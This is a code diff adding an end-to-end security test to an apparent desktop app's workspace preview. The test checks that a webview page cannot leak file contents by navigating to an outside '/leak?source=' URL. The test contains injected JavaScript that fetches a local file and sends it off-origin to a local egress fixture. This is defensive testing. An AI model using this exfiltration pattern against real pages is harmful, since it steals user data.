@@ -10,10 +10,12 @@ import {
   writeSettings,
 } from './helpers/seed-config.ts'
 import { E2E_THREE_PANE_VIEWPORT, saveAppScreenshot } from './helpers/screenshot.ts'
+import { startBrowserPageFixture } from './helpers/browser-page-fixture.ts'
 import { removeE2eTree } from './helpers/remove-tree.ts'
 
 describe('workspace preview security', () => {
   let workspaceRoot = ''
+  let egress: Awaited<ReturnType<typeof startBrowserPageFixture>> | null = null
 
   before(async () => {
     workspaceRoot = mkdtempSync(join(tmpdir(), 'copse-preview-security-'))
@@ -24,6 +26,7 @@ describe('workspace preview security', () => {
         '<body><h1>Workspace preview</h1><p>Local page</p></body></html>',
     )
     writeFileSync(join(workspaceRoot, '.env'), 'COPSE_PREVIEW_SECRET=never-serve-this')
+    egress = await startBrowserPageFixture(43131)
     resetUserData()
     seedE2eViewport(E2E_THREE_PANE_VIEWPORT)
     seedEmptyProject(workspaceRoot, 'e2e-workspace-preview-security')
@@ -35,9 +38,10 @@ describe('workspace preview security', () => {
     await $('.prompt-input').waitForExist({ timeout: 30_000 })
   })
 
-  after(() => {
+  after(async () => {
     resetUserData()
     if (workspaceRoot) removeE2eTree(workspaceRoot)
+    await egress?.close()
   })
 
   it('keeps a workspace HTML page inside Copse and refuses its secret-file request', async () => {
@@ -84,5 +88,28 @@ describe('workspace preview security', () => {
     })
     expect(guestResult).toEqual(['Workspace preview', 404])
     await saveAppScreenshot('workspace-preview-protected.png', E2E_THREE_PANE_VIEWPORT)
+  })
+
+  it('blocks a workspace page from navigating off-origin with file contents', async () => {
+    if (!egress) throw new Error('Egress fixture missing')
+    const originalAddress = await $('.browser-tab-panel.is-active .browser-url-input').getValue()
+    const target = `${egress.origin}/leak?source=`
+    await browser.execute(async (targetUrl) => {
+      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
+      if (!webview) throw new Error('Workspace preview webview missing')
+      const result: unknown = await webview.executeJavaScript(
+        `(async () => { const source = await fetch('/index.html').then((response) => response.text()); location.href = ${JSON.stringify(targetUrl)} + encodeURIComponent(source); return source.length; })()`,
+      )
+      return result
+    }, target)
+    // A page navigation is asynchronous; allow the attempted request to reach
+    // the fixture before checking that the guest navigation gate prevented it.
+    await browser.pause(300)
+    expect(egress.requests).toEqual([])
+    const guestAddress = await browser.execute(() => {
+      const webview = document.querySelector<WebviewTag>('.browser-tab-panel.is-active webview')
+      return webview?.getURL()
+    })
+    expect(guestAddress).toBe(originalAddress)
   })
 })
